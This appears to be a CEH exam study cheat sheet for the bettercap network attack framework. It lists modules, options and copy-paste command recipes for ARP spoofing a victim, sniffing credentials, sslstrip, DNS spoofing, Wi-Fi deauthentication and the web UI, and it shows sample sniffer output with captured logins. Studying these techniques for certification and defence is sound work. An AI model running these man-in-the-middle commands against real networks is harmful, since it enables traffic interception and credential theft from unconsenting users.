# bettercap — the modern MITM / network attack framework

> **Ettercap's successor.** Modular, scriptable ("caplets"), has a web UI, and supports Wi-Fi, BLE, HID, and IPv4/IPv6 in one tool. For CEH exam, you'll mostly use it for ARP spoofing + HTTP proxy + sniffer combo. Commands are typed into its interactive prompt (or via `-eval`).

**Install check (Parrot — already installed):** `bettercap -version`

**Needs root.**

---

## 🎯 Cheat-flow: MITM a single victim

| Step | Command (at bettercap `>` prompt) | What it does |
|---|---|---|
| 1. Start bettercap | `sudo bettercap -iface eth0` | Interactive prompt opens |
| 2. Discover hosts | `net.probe on` | Sends probes, builds host list |
| 3. Show hosts | `net.show` | See IPs, MACs, vendors |
| 4. Target one victim | `set arp.spoof.targets 10.10.10.5` | Who to poison |
| 5. **Start ARP spoof** | `arp.spoof on` | Poison victim + gateway |
| 6. **Start sniffer** | `net.sniff on` | Log seen creds/URLs/DNS |
| 7. **HTTP proxy** (optional) | `http.proxy on` | Inject/modify HTTP |
| 8. Stop | `arp.spoof off; net.sniff off; q` | Clean up |

---

## 🔑 Modules you must know cold

Each module is toggled with `<module> on` / `<module> off`. Options are set with `set <module>.<opt> <value>`.

| Module | Purpose |
|---|---|
| `net.probe` | Actively probe the LAN to discover hosts |
| `net.recon` | Passive host discovery (on by default) |
| `net.show` | Print the current host list |
| `net.sniff` | Sniff traffic, extract creds/URLs/DNS |
| **`arp.spoof`** | **ARP cache poisoning** (the core MITM) |
| `dhcp6.spoof` | IPv6 SLAAC / DHCPv6 spoofing |
| `dns.spoof` | Fake DNS responses |
| `http.proxy` | Transparent HTTP proxy (inject JS, modify) |
| `https.proxy` | HTTPS proxy with fake cert |
| `http.server` | Serve files over HTTP |
| `ticker` | Periodic commands |
| `events.stream` | Real-time event log |
| `wifi.recon` | 802.11 scanning (monitor mode) |
| `wifi.deauth` | Deauth attack |
| `ble.recon` | Bluetooth LE recon |
| `api.rest` | REST API (for web UI) |
| `ui` | Web UI at http://127.0.0.1 |

List modules: `help` at the prompt.

---

## 🔑 Key options (use `set`)

| Option | Example | Meaning |
|---|---|---|
| `arp.spoof.targets` | `set arp.spoof.targets 10.10.10.5,10.10.10.6` | Victim IP(s) |
| `arp.spoof.fullduplex` | `set arp.spoof.fullduplex true` | Poison gateway too (default: true) |
| `arp.spoof.internal` | `set arp.spoof.internal true` | Spoof internal-internal traffic |
| `net.sniff.verbose` | `set net.sniff.verbose true` | Print every packet |
| `net.sniff.filter` | `set net.sniff.filter "tcp port 80"` | BPF filter |
| `net.sniff.regexp` | `set net.sniff.regexp "password"` | Only log lines matching |
| `net.sniff.output` | `set net.sniff.output /tmp/sniff.pcap` | Write pcap |
| `http.proxy.sslstrip` | `set http.proxy.sslstrip true` | SSL strip |
| `dns.spoof.domains` | `set dns.spoof.domains *.google.com` | Which domains |
| `dns.spoof.address` | `set dns.spoof.address 10.10.14.3` | Where to point them |

Apply with `get <opt>` to read, `set <opt> <val>` to write.

---

## 📋 Command recipes (copy-paste)

### Interactive
```bash
sudo bettercap -iface eth0
```
Then at the `>` prompt:
```
net.probe on
net.show
set arp.spoof.targets 10.10.10.5
arp.spoof on
net.sniff on
```

### One-liner with `-eval` (no interactive)
```bash
# Full MITM + sniffer in one command
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 10.10.10.5; arp.spoof on; net.sniff on"

# MITM with HTTP proxy + sslstrip
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 10.10.10.5; set http.proxy.sslstrip true; arp.spoof on; http.proxy on; net.sniff on"

# DNS spoof every domain to your box
sudo bettercap -iface eth0 -eval "set dns.spoof.all true; set dns.spoof.address 10.10.14.3; set arp.spoof.targets 10.10.10.5; arp.spoof on; dns.spoof on"
```

### Pre-built caplets
Bettercap ships with `.cap` files under `/usr/share/bettercap/caplets/`:
```bash
sudo bettercap -iface eth0 -caplet http-ui      # launches web UI
sudo bettercap -iface eth0 -caplet https-ui     # HTTPS web UI
sudo bettercap -iface eth0 -caplet mitm6        # IPv6 MITM
```

### Wi-Fi
```bash
# Put wlan0 in monitor mode first (see aircrack-ng.md)
sudo bettercap -iface wlan0mon -eval "wifi.recon on"
# Then at the prompt:
#   wifi.show                   - list APs
#   wifi.deauth <BSSID>         - deauth attack
```

### Web UI
```bash
sudo bettercap -iface eth0 -caplet http-ui
# Browse http://127.0.0.1 — default creds in /usr/share/bettercap/caplets/http-ui.cap
```

---

## 🔑 Reading the sniffer output

With `net.sniff on`, bettercap tags credentials automatically:

```
[net.sniff.mdns] ...
[net.sniff.http.request] 10.10.10.5 GET http://victim.com/login
[net.sniff.http.post] 10.10.10.5 POST /login user=admin&password=hunter2
[net.sniff.creds] 10.10.10.5 > http://victim.com [http] admin : hunter2
```

The `[net.sniff.creds]` line is what you're looking for in most credential-sniffing questions.

---

## ⚠️ Gotchas

- **Don't run alongside ettercap** — they fight over ARP tables.
- **IP forwarding** is set automatically by bettercap when `arp.spoof` starts — you don't need `sysctl -w` like with ettercap.
- **ARP spoof needs both directions** — `arp.spoof.fullduplex true` (default). If set false, you only get victim→gateway traffic.
- **HTTPS caveat:** `http.proxy.sslstrip` only works against sites that don't use HSTS. Modern sites won't be strippable.
- **DNS spoofing** requires ARP spoof to be active too (you have to be on the packet path).
- **Interactive prompt uses `;`** to separate commands on one line: `arp.spoof on; net.sniff on`.
- **Caplets = scripts** — they're just newline-separated commands. You can write your own (`.cap` file) and run with `-caplet`.
- **Web UI** credentials are in the `http-ui.cap` file — change them before exposing.
- **Wi-Fi modules** need monitor mode on a supported adapter; same prep as [aircrack-ng](aircrack-ng.md).
- **Events:** `events.show` to see backlog, `events.clear` to reset. Useful when the prompt scrolls too fast.
- **Stop cleanly:** `q` at the prompt. Bettercap sends restore ARPs.
- **Verify poisoning** from the victim: `arp -a` should show the gateway IP with *your* MAC.

---

## 🔗 Related

- [ettercap](ettercap.md) — older equivalent; same ARP-poisoning concept
- [wireshark](wireshark.md) — analyze the pcap bettercap writes
- [aircrack-ng](aircrack-ng.md) — Wi-Fi modules need monitor mode from airmon-ng
- [08-sniffing domain README](../08-sniffing/README.md)
- [MITM playbook](../playbooks/mitm-playbook.md)
